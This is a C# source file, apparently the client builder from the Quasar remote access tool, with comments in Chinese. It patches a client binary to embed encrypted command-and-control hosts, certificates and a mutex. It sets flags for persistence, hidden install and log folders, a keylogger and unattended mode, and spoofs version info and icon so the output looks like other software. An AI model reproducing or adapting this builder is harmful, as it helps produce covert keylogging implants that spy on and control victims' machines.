using Mono.Cecil;
using Mono.Cecil.Cil;
using Quasar.Common.Cryptography;
using Quasar.Server.Models;
using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using Vestris.ResourceLib;

namespace Quasar.Server.Build
{
    /// <summary>
    /// 提供用于创建自定义客户端可执行文件的方法。
    /// </summary>
    public class ClientBuilder
    {
        private readonly BuildOptions _options;
        private readonly string _clientFilePath;

        public ClientBuilder(BuildOptions options, string clientFilePath)
        {
            _options = options;
            _clientFilePath = clientFilePath;
        }

        /// <summary>
        /// 构建一个客户端可执行文件。
        /// </summary>
        public void Build()
        {
            using (AssemblyDefinition asmDef = AssemblyDefinition.ReadAssembly(_clientFilePath))
            {
                // PHASE 1 - 写作设置
                WriteSettings(asmDef);

                // PHASE 2 - 重新命名
                Renamer r = new Renamer(asmDef);

                if (!r.Perform())
                    throw new Exception("renaming failed");

                // PHASE 3 - 将设置好的客户端写入到OutputPath
                r.AsmDef.Write(_options.OutputPath);
            }

            // PHASE 4 - 装配信息变化
            if (_options.AssemblyInformation != null)
            {
                VersionResource versionResource = new VersionResource();
                versionResource.LoadFrom(_options.OutputPath);

                versionResource.FileVersion = _options.AssemblyInformation[7];
                versionResource.ProductVersion = _options.AssemblyInformation[6];
                versionResource.Language = 0;

                StringFileInfo stringFileInfo = (StringFileInfo) versionResource["StringFileInfo"];
                stringFileInfo["CompanyName"] = _options.AssemblyInformation[2];
                stringFileInfo["FileDescription"] = _options.AssemblyInformation[1];
                stringFileInfo["ProductName"] = _options.AssemblyInformation[0];
                stringFileInfo["LegalCopyright"] = _options.AssemblyInformation[3];
                stringFileInfo["LegalTrademarks"] = _options.AssemblyInformation[4];
                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
                stringFileInfo["FileVersion"] = versionResource.FileVersion;
                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
                stringFileInfo["InternalName"] = _options.AssemblyInformation[5];
                stringFileInfo["OriginalFilename"] = _options.AssemblyInformation[5];

                versionResource.SaveTo(_options.OutputPath);
            }

            // PHASE 5 - 图标变化
            if (!string.IsNullOrEmpty(_options.IconPath))
            {
                IconFile iconFile = new IconFile(_options.IconPath);
                IconDirectoryResource iconDirectoryResource = new IconDirectoryResource(iconFile);
                iconDirectoryResource.SaveTo(_options.OutputPath);
            }
        }

        private void WriteSettings(AssemblyDefinition asmDef)
        {
            ///https://docs.microsoft.com/zh-cn/dotnet/api/system.security.cryptography.x509certificates.x509certificate2?view=net-5.0
            ///X.509 结构源自国际标准化组织 (ISO) 工作组。 此结构可用于表示各种类型的信息，包括标识、权利和持有者属性 (权限、年龄、性别、位置、从属关系等) 。
            var caCertificate = new X509Certificate2(Settings.CertificatePath, "", X509KeyStorageFlags.Exportable);
            var serverCertificate = new X509Certificate2(caCertificate.Export(X509ContentType.Cert)); // export without private key, very important!

            var key = serverCertificate.Thumbprint;
            var aes = new Aes256(key);

            byte[] signature;
            // https://stackoverflow.com/a/49777672 RSACryptoServiceProvider必须在.NET 4.6中进行修改。
            using (var csp = (RSACryptoServiceProvider) caCertificate.PrivateKey)
            {
                var hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(key));
                signature = csp.SignHash(hash, CryptoConfig.MapNameToOID("SHA256"));
            }


            
            foreach (var typeDef in asmDef.Modules[0].Types)
            {
                if (typeDef.FullName == "Quasar.Client.Config.Settings")
                {
                    foreach (var methodDef in typeDef.Methods)
                    {
                        if (methodDef.Name == ".cctor")
                        {
                            int strings = 1, bools = 1;

                            for (int i = 0; i < methodDef.Body.Instructions.Count; i++)
                            {
                                if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldstr) // string
                                {
                                    switch (strings)
                                    {
                                        case 1: //版本
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.Version);
                                            break;
                                        case 2: //ip/主机名
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.RawHosts);
                                            break;
                                        case 3: //install sub
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.InstallSub);
                                            break;
                                        case 4: //install name
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.InstallName);
                                            break;
                                        case 5: //mutex
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.Mutex);
                                            break;
                                        case 6: //start up key
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.StartupName);
                                            break;
                                        case 7: //加密密钥
                                            methodDef.Body.Instructions[i].Operand = key;
                                            break;
                                        case 8: //标签
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.Tag);
                                            break;
                                        case 9: //日志目录名称
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.LogDirectoryName);
                                            break;
                                        case 10: //服务器签名
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(signature));
                                            break;
                                        case 11: //服务器证书
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(serverCertificate.Export(X509ContentType.Cert)));
                                            break;
                                    }
                                    strings++;
                                }
                                else if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldc_I4_1 ||
                                         methodDef.Body.Instructions[i].OpCode == OpCodes.Ldc_I4_0) // bool
                                {
                                    switch (bools)
                                    {
                                        case 1: //install
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.Install));
                                            break;
                                        case 2: //startup
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.Startup));
                                            break;
                                        case 3: //隐藏文件
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.HideFile));
                                            break;
                                        case 4: //键盘记录器
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.Keylogger));
                                            break;
                                        case 5: //隐藏日志目录
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.HideLogDirectory));
                                            break;
                                        case 6: // 隐藏安装子目录
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.HideInstallSubdirectory));
                                            break;
                                        case 7: // 无人值守模式
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.UnattendedMode));
                                            break;
                                    }
                                    bools++;
                                }
                                else if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldc_I4) // int
                                {
                                    //重新连接延时
                                    methodDef.Body.Instructions[i].Operand = _options.Delay;
                                }
                                else if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldc_I4_S) // sbyte
                                {
                                    methodDef.Body.Instructions[i].Operand = GetSpecialFolder(_options.InstallPath);
                                }
                            }
                        }
                    }
                }
            }
        }

        /// <summary>
        /// 获取与所提供的bool值相对应的OpCode。
        /// </summary>
        /// <param name="p">要转换为OpCode的值</param>
        /// <returns>返回代表所提供数值的OpCode。</returns>
        private OpCode BoolOpCode(bool p)
        {
            return (p) ? OpCodes.Ldc_I4_1 : OpCodes.Ldc_I4_0;
        }

        /// <summary>
        /// 试图从提供的安装路径值中获取一个特殊文件夹的签名字节值。
        /// </summary>
        /// <param name="installPath">安装路径的整数值。</param>
        /// <returns>返回特殊文件夹的签名字节值。</returns>
        /// <exception cref="ArgumentException">如果通往特殊文件夹的路径无效，则抛出该问题。</exception>
        private sbyte GetSpecialFolder(int installPath)
        {
            switch (installPath)
            {
                case 1:
                    return (sbyte)Environment.SpecialFolder.ApplicationData;
                case 2:
                    return (sbyte)Environment.SpecialFolder.ProgramFiles;
                case 3:
                    return (sbyte)Environment.SpecialFolder.System;
                default:
                    throw new ArgumentException("InstallPath");
            }
        }
    }
}
